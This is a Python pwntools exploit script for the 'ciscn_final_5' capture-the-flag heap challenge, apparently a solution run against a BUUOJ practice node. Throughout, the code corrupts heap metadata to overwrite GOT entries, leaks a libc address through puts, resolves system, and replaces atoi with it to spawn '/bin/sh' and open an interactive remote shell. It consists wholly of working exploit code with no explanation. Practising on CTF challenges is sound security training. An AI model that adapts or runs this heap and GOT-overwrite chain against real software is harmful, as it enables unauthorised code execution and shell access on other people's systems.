#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/06/08 15:46:11
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('ciscn_final_5')
    libc = ELF('./libc.so.6')
else:
    IP = 'node3.buuoj.cn'
    port = 27499
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
elf = ELF('ciscn_final_5')
ptr = 0x6020e0
free_got = 0x602018
puts_plt = 0x400790
puts_got = 0x602020
atoi_got = 0x602078

def cmd(choice):
    sh.recvuntil("your choice: ")
    sh.sendline(str(choice))

def add(idx,size,content):
    cmd(1)
    sh.recvuntil("index: ")
    sh.sendline(str(idx))
    sh.recvuntil("size: ")
    sh.sendline(str(size))
    sh.recvuntil("content: ")
    sh.send(content)

def dele(idx):
    cmd(2)
    sh.recvuntil("index: ")
    sh.sendline(str(idx))

def edit(idx,content):
    cmd(3)
    sh.recvuntil("index: ")
    sh.sendline(str(idx))
    sh.recvuntil("content: ")
    sh.send(content)

add(16,0x10,p64(0)+p64(0x90))
add(1, 0xc0, 'aa')
dele(0)
dele(1)
payload = p64(0) + p64(0x21) + p64(ptr)
add(2,0x80,payload)
add(3,0xc0,"a")
payload = p64(free_got) + p64(puts_got + 1) + p64(atoi_got - 4) + p64(0) * 17 + p32(0x10) * 8
add(4,0xc0,payload)
edit(8,p64(puts_plt)*2)
dele(1)
puts_addr = u64(sh.recvuntil("\x7f").ljust(8,"\x00"))
libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
edit(4,p64(system_addr)*2)
sh.recvuntil("your choice: ")
sh.sendline("/bin/sh\x00")
sh.interactive()